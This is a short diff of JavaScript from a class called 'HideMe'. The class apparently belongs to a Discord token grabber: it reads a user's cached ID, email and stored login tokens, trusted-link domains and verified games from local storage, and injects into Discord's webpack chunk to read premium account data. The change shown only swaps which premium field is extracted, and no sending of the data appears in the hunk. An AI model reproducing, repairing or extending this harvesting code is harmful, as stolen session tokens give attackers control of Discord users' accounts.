@@ -143,7 +143,7 @@ class HideMe {
         var actualUserID = await getLocalStorageInfo("user_id_cache");
         //var actualUserSettings = await getLocalStorageInfo("UserSettingsStore"); //Pretty Big
         var actualUserEmail = await getLocalStorageInfo("email_cache");
-        var actualUserPremiumState = window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{for(const r of Object.keys(e.c).map(r=>e.c[r].exports).filter(e=>e)){if(r.default&&void 0!==r.default.getCurrentUser)return JSON.parse(JSON.stringify(r.default.getCurrentUser())).premiumUsageFlags;if(void 0!==r.getCurrentUser)return JSON.parse(JSON.stringify(r.getCurrentUser())).premiumUsageFlags}}]);
+        var actualUserPremiumState = window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{for(const r of Object.keys(e.c).map(r=>e.c[r].exports).filter(e=>e)){if(r.default&&void 0!==r.default.getCurrentUser)return JSON.parse(JSON.stringify(r.default.getCurrentUser())).premiumType;if(void 0!==r.getCurrentUser)return JSON.parse(JSON.stringify(r.getCurrentUser())).premiumType}}]);
         var storedTokens = await getLocalStorageInfo("tokens"); // For New Multi Account System
         var trustedDomains = await getLocalStorageInfo("MaskedLinkStore"); // Trusted Domains List(when you trust them with the "Yes" button)
         var verifiedGameAndProgramsList = await getLocalStorageInfo("GameStoreReportedGames"); //List of VERIFIED games/programs
